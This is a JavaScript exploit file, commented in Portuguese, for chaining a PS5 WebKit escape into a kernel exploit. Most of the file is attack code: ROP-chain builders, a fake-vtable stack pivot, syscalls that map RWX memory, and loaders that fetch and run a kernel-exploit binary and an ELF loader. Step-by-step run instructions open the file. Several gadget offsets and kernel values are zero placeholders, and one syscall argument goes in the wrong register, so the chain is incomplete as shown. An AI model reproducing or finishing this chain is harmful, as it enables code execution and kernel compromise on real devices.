/*
 * webkit_aio.js
 * Adaptação do aioshellcode.js (Y2JB/ufm42) para o escape WebKit do Jordy (slopkit)
 *
 * PRÉ-REQUISITO: notify.html rodou com sucesso e as variáveis globais abaixo
 * estão disponíveis no escopo da página:
 *
 *   webkitBase   - base do módulo WebKit
 *   libcBase     - base do libkernel (Jordy chama de libcBase mas é libkernel)
 *   kernelBase   - base do kernel do OS (KASLR derrotado)
 *   arenaBuffer  - ArrayBuffer na heap do WebKit (região controlada)
 *   arenaView    - Uint8Array view do arenaBuffer
 *   arenaBacking - endereço físico do backing store do arenaBuffer
 *
 * COMO USAR:
 *   1. Serve notify.html no Termux e abre no browser do PS5
 *   2. Quando aparecer "NOTIFICATION SENT", notify.html exporta as variáveis acima
 *   3. Carrega este arquivo como <script> na mesma página após o sucesso
 *   4. Chama: await webkit_aio_main()
 *
 * ARQUIVOS NECESSÁRIOS no mesmo diretório do servidor:
 *   kexp_2026_05_25.bin  (do Y2JB ou BD-JB5)
 *   elfldr-ps5-1360.elf  (do Y2JB)
 */

"use strict";

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 1 — Constantes PS5/FreeBSD
// ─────────────────────────────────────────────────────────────────────────────

const PAGE_SIZE     = 0x4000n;
const PROT_READ     = 0x1n;
const PROT_WRITE    = 0x2n;
const PROT_EXEC     = 0x4n;
const PROT_RWX      = PROT_READ | PROT_WRITE | PROT_EXEC;
const MAP_SHARED    = 0x1n;
const MAP_PRIVATE   = 0x2n;
const MAP_ANONYMOUS = 0x1000n;

const SYSCALL = {
    read:         3n,
    write:        4n,
    open:         5n,
    close:        6n,
    getpid:       20n,
    pipe:         42n,
    socket:       97n,
    setsockopt:   105n,
    getsockopt:   118n,
    mmap:         197n,
    jitshm_create: 533n,   // syscall PS5-específico
};

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 2 — Offsets do Jordy para FW 13.60 (de offsets.json)
// ─────────────────────────────────────────────────────────────────────────────
// Nomenclatura Jordy → significado real:
//   gd  = gadget natural trampoline em libkernel
//   nt  = notify offset em libkernel
//   gps = slot getpid no GOT do WebKit
//   gpe = getpid offset em libkernel
//   cls = slot close no GOT do WebKit
//   cle = close offset em libkernel
//   ers = slot __error no GOT do WebKit
//   ere = __error offset em libkernel

const OFFSETS_1360 = {
    gadget_trampoline: 0x1d6fan,   // em libkernel (natural trampoline)
    notify:            0x48b0n,    // em libkernel
    getpid_slot:       0x334e238n, // GOT do WebKit
    getpid_exp:        0x1b860n,   // em libkernel
    close_slot:        0x334e228n,
    close_exp:         0x274e0n,
    error_slot:        0x334e230n,
    error_exp:         0xf7d0n,
    // A instrução `syscall` dentro de getpid fica em getpid_exp + 5
    // FreeBSD: mov eax, SYS_getpid (5 bytes) → syscall (2 bytes) → ret
    // Portanto syscall_wrapper = libcBase + getpid_exp + 5
    syscall_wrapper_delta: 0x1b865n,
};

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 3 — Gadgets ROP no WebKit (FW 13.60)
// ─────────────────────────────────────────────────────────────────────────────
// [TODO] Estes offsets precisam ser determinados extraindo o WebKit do firmware
//        e rodando: ROPgadget --binary WebKit --rop | grep "gadget"
//
// Como encontrar:
//   1. Extrai WebKit.dylib do firmware 13.60 descriptografado
//   2. pip install ropgadget
//   3. ROPgadget --binary WebKit.dylib --rop | grep "pop rdi ; ret"
//
// Os offsets abaixo são PLACEHOLDERS — substitua pelos valores reais

const ROP = {
    // Stack pivot: troca RSP por RDI e retorna
    // Procura: "xchg rsp, rdi ; ret" ou "xchg rdi, rsp ; ret"
    pivot_xchg_rsp_rdi: 0n,   // [TODO] webkitBase + offset

    // Gadgets padrão para montar argumentos de função (SysV AMD64 ABI)
    pop_rax:            0n,   // [TODO] pop rax ; ret
    pop_rdi:            0n,   // [TODO] pop rdi ; ret  (arg1)
    pop_rsi:            0n,   // [TODO] pop rsi ; ret  (arg2)
    pop_rdx:            0n,   // [TODO] pop rdx ; ret  (arg3)
    pop_rcx:            0n,   // [TODO] pop rcx ; ret  (arg4, não usado em syscall)
    pop_r8:             0n,   // [TODO] pop r8  ; ret  (arg5)
    pop_r9:             0n,   // [TODO] pop r9  ; ret  (arg6)
    pop_rbp:            0n,   // [TODO] pop rbp ; ret
    call_rax:           0n,   // [TODO] call rax ; (nop/ret) — chama função em rax

    // Escrita de resultado
    mov_qword_rdi_rax:  0n,   // [TODO] mov qword [rdi], rax ; ret

    // Restauração de stack após ROP (pivot de volta)
    mov_rsp_rbp:        0n,   // [TODO] mov rsp, rbp ; pop rbp ; ret
    ret:                0n,   // [TODO] ret (alinhamento)
};

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 4 — Primitivas de memória usando o carrier chain do Jordy
// ─────────────────────────────────────────────────────────────────────────────
// O Jordy já tem read/write na heap do WebKit via arenaView.
// Aqui empacotamos como read64/write64 para uso geral.

// Escreve 8 bytes (BigInt) em arenaView no offset dado
function arena_write64(offset, value) {
    const off = Number(offset);
    const v = BigInt(value);
    for (let i = 0; i < 8; i++) {
        arenaView[off + i] = Number((v >> BigInt(i * 8)) & 0xFFn);
    }
}

// Lê 8 bytes de arenaView como BigInt
function arena_read64(offset) {
    const off = Number(offset);
    let v = 0n;
    for (let i = 0; i < 8; i++) {
        v |= BigInt(arenaView[off + i]) << BigInt(i * 8);
    }
    return v;
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 5 — Construção da ROP chain na arena
// ─────────────────────────────────────────────────────────────────────────────
// Layout da arena após notify.html:
//   +0x000 : fakeUCollator     (Jordy usa 0x100)
//   +0x100 : fakeUCollator obj
//   +0x300 : fakeVtable
//   +0x500 : [NOSSA] ROP chain
//   +0x700 : [NOSSO] return value buffer
//   +0x800 : [NOSSO] buffer para resultados intermediários

const ARENA = {
    fake_ucollator: 0x100,
    fake_vtable:    0x300,
    rop_chain:      0x500,   // onde escrevemos a ROP chain
    return_val:     0x700,   // onde a ROP chain salva o resultado
    scratch:        0x800,   // buffer temporário
};

let rop_offset = 0;  // cursor na ROP chain

function rop_reset() {
    rop_offset = ARENA.rop_chain;
}

function rop_push(val) {
    arena_write64(rop_offset, val);
    rop_offset += 8;
}

function buildRopCall(fn_addr, arg1=0n, arg2=0n, arg3=0n, arg4=0n, arg5=0n, arg6=0n) {
    const wb = webkitBase;
    const return_val_addr = arenaBacking + BigInt(ARENA.return_val);

    // Monta argumentos nos registradores certos (SysV AMD64)
    rop_push(wb + ROP.pop_rdi);  rop_push(arg1);
    rop_push(wb + ROP.pop_rsi);  rop_push(arg2);
    rop_push(wb + ROP.pop_rdx);  rop_push(arg3);
    rop_push(wb + ROP.pop_rcx);  rop_push(arg4);
    rop_push(wb + ROP.pop_r8);   rop_push(arg5);
    rop_push(wb + ROP.pop_r9);   rop_push(arg6);

    // Chama a função
    rop_push(fn_addr);

    // Salva retorno (rax) em return_val_addr
    rop_push(wb + ROP.pop_rdi);
    rop_push(return_val_addr);
    rop_push(wb + ROP.mov_qword_rdi_rax);
}

function buildRopSyscall(syscall_num, arg1=0n, arg2=0n, arg3=0n, arg4=0n, arg5=0n, arg6=0n) {
    const wb = webkitBase;
    const lk = libcBase;  // libkernel base
    const syscall_wrapper = lk + OFFSETS_1360.syscall_wrapper_delta;
    const return_val_addr = arenaBacking + BigInt(ARENA.return_val);

    // FreeBSD syscall: rax = número, args em rdi rsi rdx r10 r8 r9
    // Nota: arg4 vai em r10 em syscalls FreeBSD, não rcx
    rop_push(wb + ROP.pop_rax);  rop_push(syscall_num);
    rop_push(wb + ROP.pop_rdi);  rop_push(arg1);
    rop_push(wb + ROP.pop_rsi);  rop_push(arg2);
    rop_push(wb + ROP.pop_rdx);  rop_push(arg3);
    // r10 = arg4 (FreeBSD usa r10 em vez de rcx para syscalls)
    rop_push(wb + ROP.pop_rcx);  rop_push(arg4);  // pop_r10 se disponível, senão pop_rcx
    rop_push(wb + ROP.pop_r8);   rop_push(arg5);
    rop_push(wb + ROP.pop_r9);   rop_push(arg6);

    // Chama syscall_wrapper = libkernel + getpid + 5 (aponta para instrução syscall)
    rop_push(syscall_wrapper);

    // Salva retorno
    rop_push(wb + ROP.pop_rdi);
    rop_push(return_val_addr);
    rop_push(wb + ROP.mov_qword_rdi_rax);
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 6 — Modificar vtable para pivot em vez de notify
// ─────────────────────────────────────────────────────────────────────────────
// O gadget trampoline do Jordy faz:
//   mov rcx, [rdi+0xe0]   ; carrega endereço alvo
//   push rcx              ; empilha como ret addr
//   mov rcx, [rdi+0x60]   ; rcx = campo +0x60
//   mov rdi, [rdi+0x48]   ; rdi = campo +0x48   ← CONTROLAMOS
//   ret                   ; salta para [rdi+0xe0]
//
// Para pivot de stack:
//   - +0xe0 = endereço do gadget "xchg rsp, rdi ; ret"
//   - +0x48 = endereço da nossa ROP chain na arena
//   - Resultado: RSP aponta pra nossa ROP chain → execução arbitrária

function patchVtableForPivot() {
    const UC = ARENA.fake_ucollator;
    const wb = webkitBase;
    const rop_chain_addr = arenaBacking + BigInt(ARENA.rop_chain);
    const pivot_addr = wb + ROP.pivot_xchg_rsp_rdi;

    // Muda alvo de notify para o gadget de pivot
    arena_write64(UC + 0xe0, pivot_addr);

    // RDI (após o trampoline) = endereço da ROP chain
    arena_write64(UC + 0x48, rop_chain_addr);
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 7 — Trigger da chamada nativa
// ─────────────────────────────────────────────────────────────────────────────
// notify.html precisa exportar a função trigger pro escopo global.
// Adicione no final de notify.html, antes de succeeded():
//
//   window._ps5_trigger = () => compareFn(notificationRequest, "b");
//
// Depois chame window._ps5_trigger() daqui.

function triggerNativeCall() {
    if (typeof window._ps5_trigger !== 'function') {
        throw new Error(
            "notify.html não exportou _ps5_trigger. " +
            "Adicione: window._ps5_trigger = () => compareFn(notificationRequest, 'b');" +
            " antes da chamada succeeded() no notify.html"
        );
    }
    window._ps5_trigger();
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 8 — Mapeamento do kexp.bin como memória executável
// ─────────────────────────────────────────────────────────────────────────────

async function fetchBinary(filename) {
    const resp = await fetch(filename);
    if (!resp.ok) throw new Error(`Falha ao carregar ${filename}: ${resp.status}`);
    const buf = await resp.arrayBuffer();
    return new Uint8Array(buf);
}

async function mapShellcode(bin_data) {
    const size = BigInt(bin_data.length);
    const aligned = (size + PAGE_SIZE - 1n) & ~(PAGE_SIZE - 1n);

    // ROP: jitshm_create(NULL, aligned_size, PROT_RWX=7)
    rop_reset();
    buildRopSyscall(SYSCALL.jitshm_create, 0n, aligned, 0x7n);
    patchVtableForPivot();
    triggerNativeCall();

    const jit_fd = arena_read64(ARENA.return_val);
    if (jit_fd >= 0xFFFFFFFFFFFF0000n) {
        throw new Error("jitshm_create falhou: " + jit_fd.toString(16));
    }
    console.log("[*] jit_fd =", jit_fd.toString(16));

    // ROP: mmap(NULL, aligned_size, PROT_RWX, MAP_SHARED, jit_fd, 0)
    rop_reset();
    buildRopSyscall(SYSCALL.mmap, 0n, aligned, PROT_RWX, MAP_SHARED, jit_fd, 0n);
    patchVtableForPivot();
    triggerNativeCall();

    const exec_addr = arena_read64(ARENA.return_val);
    if (exec_addr === 0n || exec_addr >= 0xFFFFFFFFFFFF0000n) {
        throw new Error("mmap falhou: " + exec_addr.toString(16));
    }
    console.log("[*] RWX memory @ 0x" + exec_addr.toString(16));

    // Escreve shellcode na memória RWX via write()
    // Precisa: endereço temporário do bin_data acessível pelo kernel
    // Usamos a arena como buffer intermediário (limitado a ~0x300 bytes por vez)
    // Para bins maiores, divide em chunks
    const CHUNK = 0x200;
    let written = 0n;
    while (written < size) {
        const chunk_size = size - written < BigInt(CHUNK) ? size - written : BigInt(CHUNK);
        // Copia chunk pra arena scratch
        for (let i = 0n; i < chunk_size; i++) {
            arenaView[Number(BigInt(ARENA.scratch) + i)] = bin_data[Number(written + i)];
        }
        const scratch_addr = arenaBacking + BigInt(ARENA.scratch);

        // ROP: write(jit_fd, scratch_addr, chunk_size)
        rop_reset();
        buildRopSyscall(SYSCALL.write, jit_fd, scratch_addr, chunk_size);
        patchVtableForPivot();
        triggerNativeCall();

        written += chunk_size;
    }

    console.log("[*] Shellcode escrito (" + size.toString() + " bytes)");
    return exec_addr;
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 9 — Execução do shellcode (kexp.bin)
// ─────────────────────────────────────────────────────────────────────────────
// O kexp.bin espera uma estrutura de args com:
//   +0x00: master_pipe[0]  (int32)
//   +0x04: master_pipe[1]  (int32)
//   +0x08: victim_pipe[0]  (int32)
//   +0x0C: victim_pipe[1]  (int32)
//   +0x10: allproc         (uint64) — endereço da lista de processos no kernel
//   +0x18: elfldr_addr     (uint64)
//   +0x20: elfldr_size     (uint64)
//
// [TODO] allproc, master_pipe e victim_pipe precisam ser obtidos
//        via kernel R/W (ipv6_kernel_rw do kernel.js do Y2JB)
//        Uma vez que syscall() esteja funcionando, kernel.js roda sem alteração.

async function runShellcode(exec_addr, allproc, master_pipe, victim_pipe, elfldr_addr, elfldr_size) {
    // Aloca buffer de args na arena
    const args_off = ARENA.scratch;
    const args_addr = arenaBacking + BigInt(args_off);

    // Escreve struct de args
    const writeInt32 = (off, val) => {
        const v = Number(val) >>> 0;
        arenaView[off]   =  v        & 0xFF;
        arenaView[off+1] = (v >>  8) & 0xFF;
        arenaView[off+2] = (v >> 16) & 0xFF;
        arenaView[off+3] = (v >> 24) & 0xFF;
    };

    writeInt32(args_off + 0x00, master_pipe[0]);
    writeInt32(args_off + 0x04, master_pipe[1]);
    writeInt32(args_off + 0x08, victim_pipe[0]);
    writeInt32(args_off + 0x0C, victim_pipe[1]);
    arena_write64(args_off + 0x10, allproc);
    arena_write64(args_off + 0x18, elfldr_addr);
    arena_write64(args_off + 0x20, elfldr_size);

    console.log("[*] Lançando kexp.bin @ 0x" + exec_addr.toString(16));

    // [TODO] Chamar exec_addr com args_addr como argumento
    // Precisa de Thrd_create (libScePthread) para spawnar thread nativa
    // Alternativa: chamar diretamente via ROP se o kexp.bin aceitar chamada direta
    //
    // ROP: call exec_addr(args_addr)
    rop_reset();
    buildRopCall(exec_addr, args_addr);
    patchVtableForPivot();
    triggerNativeCall();

    const result = arena_read64(ARENA.return_val);
    console.log("[*] kexp.bin retornou: 0x" + result.toString(16));
    return result;
}

// ─────────────────────────────────────────────────────────────────────────────
// SEÇÃO 10 — Entry point principal
// ─────────────────────────────────────────────────────────────────────────────

async function webkit_aio_main() {
    console.log("[*] webkit_aio.js iniciando...");

    // Verifica que notify.html rodou
    if (typeof webkitBase === 'undefined' || !webkitBase) {
        throw new Error("webkitBase não definida. notify.html precisa rodar primeiro.");
    }

    console.log("[*] webkitBase  = 0x" + webkitBase.toString(16));
    console.log("[*] libcBase    = 0x" + libcBase.toString(16));   // libkernel
    console.log("[*] kernelBase  = 0x" + kernelBase.toString(16)); // OS kernel

    // Verifica gadgets [TODO]
    const missing = Object.entries(ROP)
        .filter(([k, v]) => v === 0n)
        .map(([k]) => k);

    if (missing.length > 0) {
        throw new Error(
            "Offsets ROP não preenchidos: " + missing.join(", ") +
            "\nExtra: WebKit.dylib do FW 13.60 + ROPgadget"
        );
    }

    // Carrega binários do servidor
    console.log("[*] Baixando kexp_2026_05_25.bin...");
    const kexp_data = await fetchBinary("kexp_2026_05_25.bin");

    console.log("[*] Baixando elfldr-ps5-1360.elf...");
    const elfldr_data = await fetchBinary("elfldr-ps5-1360.elf");

    // Mapeia kexp.bin como executável
    const kexp_exec_addr = await mapShellcode(kexp_data);

    // [TODO] Aqui vai o kernel.js do Y2JB para obter allproc, master_pipe, victim_pipe
    // Uma vez que syscall() esteja funcionando (via ROP), kernel.js roda sem alteração:
    //
    //   await ipv6_kernel_rw.init(ofiles, kread8, kwrite8);
    //   const allproc = ...; // busca via /proc ou scan de kernel
    //   const [master_pipe, victim_pipe] = ...; // cria via pipe()
    //
    // Por ora, placeholder:
    const allproc     = 0n;   // [TODO]
    const master_pipe = [0, 0];
    const victim_pipe = [0, 0];

    // Mapeia elfldr na arena (como data, não executável — kexp.bin carrega ele)
    const elfldr_off  = 0xA00;
    const elfldr_addr = arenaBacking + BigInt(elfldr_off);
    for (let i = 0; i < elfldr_data.length; i++) {
        arenaView[elfldr_off + i] = elfldr_data[i];
    }
    const elfldr_size = BigInt(elfldr_data.length);

    console.log("[*] elfldr @ 0x" + elfldr_addr.toString(16));

    // Executa kexp.bin → ELF loader
    await runShellcode(
        kexp_exec_addr,
        allproc,
        master_pipe,
        victim_pipe,
        elfldr_addr,
        elfldr_size
    );

    console.log("[+] webkit_aio concluído. ELF loader deve estar rodando.");
}

// Expõe no escopo global para chamar pelo console do PS5
window.webkit_aio_main = webkit_aio_main;
console.log("[*] webkit_aio.js carregado. Chame: webkit_aio_main()");
